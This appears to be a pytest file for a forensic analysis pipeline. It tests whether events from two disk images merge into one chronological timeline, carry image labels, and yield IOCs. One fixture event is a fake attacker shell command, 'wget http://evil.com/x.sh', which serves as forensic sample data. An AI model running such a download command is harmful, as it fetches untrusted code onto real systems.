"""End-to-End-Test Fall-Modus: zwei Images -> gemeinsame Timeline + Report-Bausteine.

Belegt die Cross-Host-Korrelation: ein Login auf Image A und eine Aktion
auf Image B erscheinen chronologisch in EINER Timeline, jeweils mit
sichtbarem Image-Label.
"""
import sys
import tempfile
import json
from pathlib import Path
from datetime import datetime, timezone

sys.path.insert(0, str(Path(__file__).parent.parent))

from models.pipeline_context import PipelineContext
from models.event import ForensicEvent
from models.chain_of_custody import ChainOfCustody
from utils.event_store import EventStore
import stages.stage08_normalize as s8
import stages.stage07_ioc as s7
from stages.stage14_export import _evidence_source
from utils.reexport import save_ctx_snapshot


def _build_ctx():
    tmp = Path(tempfile.mkdtemp())
    case = tmp / 'case'; case.mkdir()
    db = case / 'events.db'
    evs = [
        ForensicEvent(timestamp=datetime(2024, 5, 1, 14, 2, tzinfo=timezone.utc),
            source='auth', event_type='ssh_login_success',
            message='Accepted password for admin from 10.0.0.9',
            user='admin', ip='10.0.0.9', severity='medium',
            evidence='jumpbox.E01', orig_path='/var/log/auth.log',
            partition='Partition 2 (offset 2048)', parser_name='auth', extraction='tsk_icat'),
        ForensicEvent(timestamp=datetime(2024, 5, 1, 14, 5, tzinfo=timezone.utc),
            source='bash_history', event_type='shell_command',
            message='wget http://evil.com/x.sh', severity='high',
            evidence='webserver.E01', orig_path='/root/.bash_history',
            partition='Partition 2 (offset 2048)', parser_name='bash_history', extraction='tsk_icat'),
    ]
    with EventStore(db) as s:
        s.insert_events(evs)
    ctx = PipelineContext(output_dir=tmp, case_dir=case, combined_case=True)
    ctx.events_db_path = db
    ctx.timezone = 'UTC'
    ctx.coc = ChainOfCustody(file_name='Fall', sha256='', md5='', size_gb=0,
                             start_time=datetime.now())
    ctx.coc.add_evidence('jumpbox.E01', md5='a' * 32, sha1='b' * 40, size_gb=12.4)
    ctx.coc.add_evidence('webserver.E01', md5='c' * 32, size_gb=38.1)
    ctx.evidence_items = [
        {'name': 'jumpbox.E01', 'os_name': 'Ubuntu 22.04', 'hostname': 'jumpbox',
         'file_type': 'E01', 'file_size_gb': 12.4, 'partition_layout': [{}, {}],
         'partition_profiles': [{'is_primary': True, 'partition_index': 2, 'offset': 2048}]},
        {'name': 'webserver.E01', 'os_name': 'CentOS 7', 'hostname': 'web01',
         'file_type': 'E01', 'file_size_gb': 38.1, 'partition_layout': [{}],
         'partition_profiles': [{'is_primary': True, 'partition_index': 2, 'offset': 2048}]},
    ]
    return ctx, case


def test_cross_host_timeline_chronologisch():
    ctx, _ = _build_ctx()
    ctx = s8.run(ctx)
    assert len(ctx.normalized_events) == 2
    # Login (Jumpbox) VOR Command (Webserver) — eine gemeinsame Timeline
    assert ctx.normalized_events[0].evidence == 'jumpbox.E01'
    assert ctx.normalized_events[1].evidence == 'webserver.E01'


def test_timeline_quelle_mit_image_praefix():
    ctx, _ = _build_ctx()
    ctx = s8.run(ctx)
    assert _evidence_source(ctx.normalized_events[0]) == '[jumpbox.E01] /var/log/auth.log'
    assert _evidence_source(ctx.normalized_events[1]) == '[webserver.E01] /root/.bash_history'


def test_gemeinsame_ioc_liste():
    ctx, _ = _build_ctx()
    ctx = s8.run(ctx)
    ctx = s7.run(ctx)
    urls = [i.value for i in ctx.iocs if i.type == 'url']
    assert any('evil.com' in u for u in urls)   # IOC aus webserver.E01


def test_reexport_snapshot_combined():
    ctx, case = _build_ctx()
    ctx = s8.run(ctx)
    save_ctx_snapshot(ctx, case)
    snap = json.loads((case / 'ctx_snapshot.json').read_text())
    assert snap['combined_case'] is True
    assert len(snap['evidence_items']) == 2
    assert snap['coc']['evidence_hashes']['jumpbox.E01']['sha1'] == 'b' * 40
